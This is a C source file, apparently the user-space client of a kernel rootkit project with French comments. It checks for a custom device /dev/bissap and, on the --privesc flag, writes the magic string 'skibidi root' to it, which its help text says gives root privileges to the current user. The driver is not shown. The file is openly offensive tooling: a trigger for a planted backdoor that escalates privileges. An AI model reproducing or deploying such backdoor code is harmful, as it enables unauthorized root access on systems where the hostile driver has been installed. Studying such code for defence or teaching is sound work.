#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#include "include/core.h"
#include "include/debug.h"


// voir comment intégrer la compilation de ce fichier dans le makefile

void display_help(void);
int check_driver(const char * device_path);
int privesc();

const char *driver = "/dev/bissap";

char *valid_args[] =
    {
        "-h", "--help", 
        "-p", "--privesc"
    };

void display_help(void){

    printf("Usage: \n");
    printf("    client <operation>\n");
    printf("\n");
    printf("Operations: \n");
    printf("    -h --help       Display this menu\n");
    printf("    -p --privesc    Give root privileges to current user\n");

    exit(-1);
}

//tester
int check_driver(const char * device_path){

    int fd = open(device_path, O_RDONLY);
    if (fd == -1)
    {
        printf("[-] Driver not found\n");
        return -1;
    } 
    else
        printf("[+] Driver found\n");
        return 0;
}

// check_driver est éxécuté avant donc devrait pas y avoir de soucis
int privesc(){

    // les droits root ne vont pas au processus parent -> ioctl in clutch ??
    int ret;
    int fd = open(driver, O_WRONLY);
    const char * payload = "skibidi root";

    ret = write(fd, payload, strlen(payload));

    if (ret == -1){
        printf("[-] Failed to write to device %s value : %s\n", driver, payload);
        return -1;
    } else{
        printf("[+] Wrote : '%s' for a length of %d bytes\n", payload, strlen(payload));
    }

    return 0;
}
int main(int argc, char *argv[]) {
    
    if (argc < 2)
    {
        display_help();
    }

    for (int i = 0; i < argc; i++) {
        printf("Argument %d: %s\n", i, argv[i]);

        if ((strcmp(argv[i], "--privesc") == 0) || (strcmp(argv[i], "-p") == 0))
        {
            printf("[+] Running the privesc\n");
            privesc();
        }
    }

    return 0;
}